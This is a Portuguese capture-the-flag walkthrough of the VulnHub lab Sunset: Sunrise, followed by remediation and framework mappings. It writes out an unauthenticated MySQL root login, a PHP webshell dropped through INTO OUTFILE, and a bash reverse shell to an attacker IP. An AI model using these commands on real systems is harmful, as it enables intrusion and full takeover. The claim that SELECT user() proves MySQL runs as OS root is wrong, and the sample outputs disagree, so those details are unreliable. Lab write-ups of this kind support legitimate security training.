# Sunset: Sunrise — O Banco de Dados que Queria ser Root

Bora rapaziada, Sunset: Sunrise é uma daquelas máquinas que te faz falar "cara, só isso?!" do jeito mais positivo possível. Sem mentira, é um exemplo clássico de como uma única configuração errada, MySQL exposto na rede sem senha E rodando como usuário root do Linux, destrói todas as camadas de segurança entre você e o comprometimento total do sistema. Sem movimentação lateral, sem etapas de escalação de privilégios: só MySQL para root em uma tacada. Assustador de verdade num contexto real. Parabéns ao criador por construir algo que ensina uma lição crítica do mundo real sem enrolação.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Sunset: Sunrise |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/sunset-sunrise,406/ |
| **Técnicas** | Enumeração de serviços de rede, login não autenticado ao MySQL, webshell via SQL INTO OUTFILE, shell reversa PHP, root direto via processo DB mal configurado |
| **CVEs** | CWE-287 (Autenticação Imprópria: MySQL root sem senha), CWE-250 (Execução com Privilégios Desnecessários: MySQL rodando como root do SO), CWE-434 (Escrita de Arquivo Irrestrita via INTO OUTFILE) |
| **Grupos APT** | APT41 (Winnti Group): explora rotineiramente serviços de banco de dados expostos para acesso inicial em redes corporativas; FIN7: usa instâncias MySQL expostas para movimentação lateral e exfiltração de dados |

---

## Resumo do Ataque

```
netdiscover → IP do alvo
    |
    v
nmap → porta 22 (SSH), porta 3306 (MySQL), porta 8080 (HTTP Weborf)
    |
    v
mysql -h ALVO -u root --skip-password → login bem-sucedido (sem senha)
    |
    v
SELECT user() → root@localhost (MySQL roda como root do SO)
    |
    v
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
    |
    v
curl http://ALVO:8080/shell.php?cmd=id → uid=0(root)
    |
    v
shell reversa via webshell → listener nc → shell root
    |
    v
cat /root/flag.txt → GG
```

---

## Metodologia

1. Descoberta de host para identificar o IP do alvo na rede
2. Scan completo de portas com detecção de versão de serviço
3. Identificar MySQL exposto na porta 3306 acessível do atacante
4. Tentar login root não autenticado no MySQL
5. Confirmar que o processo MySQL roda como usuário root do SO
6. Escrever webshell PHP na raiz web via SQL INTO OUTFILE
7. Acionar webshell e confirmar execução de código como root
8. Entregar shell reversa através da webshell
9. Ler flag de root

---

## Passo 1 — Descoberta de Host

```bash
sudo netdiscover -r 192.168.1.0/24
```

```
IP            At MAC Address     Count     Len  MAC Vendor
192.168.1.107  08:00:27:xx:xx:xx    1      60   PCS Systemtechnik GmbH (VirtualBox)
```

Defina seu alvo:

```bash
export TARGET=192.168.1.107
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Scan Completo de Portas

```bash
nmap -p- -sV -sC $TARGET
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian
3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB
8080/tcp open  http    Weborf httpd
```

Três serviços: SSH, MySQL, HTTP. MySQL na porta 3306 exposto na rede é o alerta imediato. Em qualquer ambiente de produção, o MySQL deveria estar vinculado a 127.0.0.1. Vê-lo exposto externamente é uma configuração crítica errada.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 3 — Login Root Não Autenticado no MySQL

```bash
mysql -h $TARGET -u root --skip-password
```

```
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

Login bem-sucedido sem senha. Verifique com quem o MySQL está rodando:

```sql
SELECT user();
-- root@%

SHOW VARIABLES LIKE 'secure_file_priv';
-- Value: (vazio) — escrita de arquivos permitida em qualquer lugar
```

Um `secure_file_priv` vazio significa que o MySQL pode escrever arquivos em qualquer diretório ao qual o processo no nível do SO tenha acesso. Como o processo roda como root, isso significa qualquer lugar. Caramba.

**Nota do mundo real:** Milhares de instâncias MySQL voltadas para a internet aceitam conexões root não autenticadas. O Shodan regularmente indexa centenas delas. APT41 usou acesso MySQL não autenticado como ponto de entrada inicial em múltiplas intrusões documentadas.

**MITRE ATT&CK:** T1078.003 — Contas Válidas: Contas Locais; T1190 — Exploração de Aplicação Pública

---

## Passo 4 — Escrever Webshell PHP via INTO OUTFILE

Identifique a raiz web do Weborf (geralmente `/var/www/html/`):

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
-- Query OK, 1 row affected
```

Verifique o acesso:

```bash
curl "http://$TARGET:8080/shell.php?cmd=id"
```

Saída esperada:

```
uid=0(root) gid=0(root) groups=0(root)
```

A webshell roda como root porque o MySQL roda como root. Esse único passo confirma o comprometimento total do sistema. Top demais (pelo lado negativo da segurança!).

**MITRE ATT&CK:** T1505.003 — Componente de Software do Servidor: Web Shell; T1059.004 — Intérprete de Comando e Script: Shell Unix

---

## Passo 5 — Shell Reversa como Root

Inicie um listener:

```bash
nc -lvnp 4444
```

Acione a shell reversa via webshell:

```bash
curl -G "http://$TARGET:8080/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1'"
```

A shell chega como root.

**Estabilização do shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm; export SHELL=bash
# Ctrl+Z, então: stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Intérprete de Comando e Script: Shell Unix

---

## Passo 6 — Flag de Root

```bash
whoami
# root

find / -name "flag*" -o -name "proof*" 2>/dev/null | head -10
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root em uma cadeia. Sem privesc necessário. Isso é a máquina inteira.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado em | Usado para |
|---|---|---|---|
| Login MySQL | root (sem senha) | Porta MySQL 3306 | Acesso ao banco de dados + escrita de webshell |
| Webshell | /var/www/html/shell.php | Escrito via INTO OUTFILE | Execução de código como root |
| Flag de root | (varia) | /root/flag.txt | Conclusão do desafio |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | MySQL exposto na porta 3306 sem senha root | CISA Alert AA22-074A avisa explicitamente sobre serviços de banco de dados expostos | Vincule MySQL a 127.0.0.1; defina senha root forte; bloqueie porta 3306 do acesso externo |
| 2 | MySQL rodando como usuário root do SO | Comprometimento do banco de dados vira comprometimento total do SO: sem escalação necessária | Execute banco de dados como usuário de baixo privilégio dedicado; nunca como root |
| 3 | secure_file_priv não configurado | Permite escrita arbitrária de arquivo em qualquer caminho acessível pelo processo DB | Configure `secure_file_priv` para um caminho restrito ou desative escritas de arquivo |
| 4 | Persistência de webshell via banco de dados | Uma vez escrita, a webshell persiste até ser removida manualmente | Verificações regulares de integridade na raiz web; monitoramento de integridade de arquivos (FIM) |
| 5 | Caminho direto para root em um passo | Campanhas APT reais exploram esse padrão para tomada imediata do sistema | Defesa em profundidade: mesmo se um controle falhar, outros devem limitar o raio de explosão |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Contas Válidas: Contas Locais | T1078.003 |
| Execução | Execução | Intérprete de Comando e Script: Shell Unix | T1059.004 |
| Persistência | Persistência | Componente de Software do Servidor: Web Shell | T1505.003 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Vincule MySQL apenas ao localhost:** `bind-address = 127.0.0.1` em `/etc/mysql/my.cnf`
2. **Defina senha root MySQL:** `ALTER USER 'root'@'localhost' IDENTIFIED BY '<senha_forte>';`
3. **Execute MySQL como usuário não-root:** verifique que `mysqld` roda como usuário `mysql`, não root
4. **Configure secure_file_priv:** `secure_file_priv = /var/lib/mysql-files/` (restrinja escritas)
5. **Bloqueie porta 3306:** `ufw deny 3306` ou equivalente; permita apenas de servidores de aplicação
6. **Ative logging de auditoria do MySQL:** rastreie todas as conexões e consultas

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todos os serviços de banco de dados; marque exposição de rede |
| Proteger | Controle de Acesso | Autenticação obrigatória para todas as contas DB; sem root sem senha |
| Proteger | Segurança de Dados | Restrinja capacidades de escrita de arquivo na configuração do banco de dados |
| Detectar | Anomalias e Eventos | Alerte sobre conexões MySQL não autenticadas; novos arquivos na raiz web |
| Responder | Planejamento de Resposta | Remova webshells; rotacione credenciais; isole host comprometido |
| Recuperar | Planejamento de Recuperação | Reconstrua o host; audite todos os dados acessados via conexão DB não autenticada |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Exija autenticação para todas as contas MySQL |
| AC-6 | Menor Privilégio | Execute MySQL como usuário OS de baixo privilégio dedicado |
| CM-7 | Menor Funcionalidade | Desative acesso de rede MySQL a menos que necessário; restrinja escrita de arquivo |
| IA-5 | Gerenciamento de Autenticadores | Aplique senhas fortes para todas as contas DB |
| SC-7 | Proteção de Fronteira | Bloqueie portas de banco de dados; sem exposição externa |
| SI-3 | Proteção contra Malware | Monitoramento de integridade de arquivo em diretórios raiz web |

### CISA KEV

Acesso MySQL não autenticado combinado com entrega de webshell via INTO OUTFILE mapeia diretamente para o CISA Alert AA21-131A (exploração de serviços de banco de dados para acesso inicial) e AA22-074A (serviços de banco de dados acessíveis pela rede explorados por grupos de ransomware). As organizações devem corrigir, restringir e monitorar serviços de banco de dados conforme orientação da CISA.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação (vincule MySQL ao localhost; desative root sem senha)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (MySQL roda como usuário sem privilégios)
- **D3-HBPI** — Fortalecer Integridade do Pipeline de Build (sem credenciais padrão em serviços implantados)
- **D3-FH** — Hashing de Arquivo (FIM na raiz web para detectar webshells injetadas)

---

## Considerações Finais

Mano, Sunset: Sunrise é uma aula magistral de "o que acontece quando você pula a lista de verificação de segurança." A máquina não requer habilidades de exploração zero: é puramente sobre reconhecer uma configuração errada e conhecer a técnica padrão para abusar dela. É exatamente isso que a torna valiosa para iniciantes. A lição é simples: portas de banco de dados expostas mais sem autenticação mais propriedade de processo root equivale a game over. Sem CVE necessário, sem 0-day, sem engenharia social.

Em engajamentos reais, encontrar uma porta MySQL exposta durante um scan sempre vale um rápido `mysql -h alvo -u root --skip-password`. Você ficaria surpreso com a frequência que funciona. Confia!

Thanks guys!! (❍ᴥ❍ʋ)
